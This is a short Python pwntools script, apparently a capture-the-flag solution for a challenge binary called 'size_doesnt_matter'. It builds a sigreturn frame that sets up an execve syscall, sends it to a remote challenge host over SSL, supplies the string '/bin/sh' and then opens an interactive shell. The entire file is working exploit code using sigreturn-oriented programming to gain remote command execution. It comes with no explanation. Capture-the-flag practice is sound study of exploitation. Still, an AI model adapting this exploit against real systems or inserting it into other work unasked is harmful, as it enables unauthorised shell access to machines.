from pwn import *

context.binary = binary = ELF('./size_doesnt_matter')

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x4020b0
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x401098
frame.rbp = 0x401098
frame.rip = 0x401098

#p = process()
p = remote('microp.ctf.prgy.in', 1337, ssl=True)

p.sendline(bytes(frame))
p.sendline(b'/bin/sh\x00AAAAAA')

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
